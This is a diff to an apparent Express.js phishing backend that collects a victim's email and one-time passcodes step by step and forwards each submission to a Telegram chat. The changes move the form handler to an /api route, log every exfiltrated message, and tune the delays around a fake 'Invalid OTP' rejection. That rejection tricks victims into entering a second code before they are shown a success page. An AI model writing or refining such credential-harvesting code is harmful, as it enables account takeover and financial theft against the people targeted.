@@ -29,6 +29,7 @@ async function sendToTelegram(message) {
       text: message,
       parse_mode: 'HTML',
     });
+    console.log('Message sent to Telegram:', message); // For debugging
   } catch (error) {
     console.error('Error sending to Telegram:', error.message);
   }
@@ -47,8 +48,9 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
-app.post('/', async (req, res) => {
-  const step = req.query.step || 'email';
+// API route for all form submissions
+app.post('/api', async (req, res) => {
+  const step = req.body.step || 'email'; // Get step from hidden input
   let error = '';
 
   if (step === 'email') {
@@ -100,15 +102,15 @@ app.post('/', async (req, res) => {
       await sendToTelegram(message);
 
       // Simulate waiting 10 seconds for the first OTP
-      await new Promise(resolve => setTimeout(resolve, 10000));
       if (req.session.otp_attempts.length === 1) {
+        await new Promise(resolve => setTimeout(resolve, 10000));
         req.session.error = 'Invalid OTP. Please try again.';
         return res.redirect('/?step=otp');
       }
 
       // Simulate waiting 5 seconds before redirecting to success after second attempt
-      await new Promise(resolve => setTimeout(resolve, 5000));
       if (req.session.otp_attempts.length >= 2) {
+        await new Promise(resolve => setTimeout(resolve, 5000));
         req.session.error = '';
         return res.redirect('/?step=success');
       }
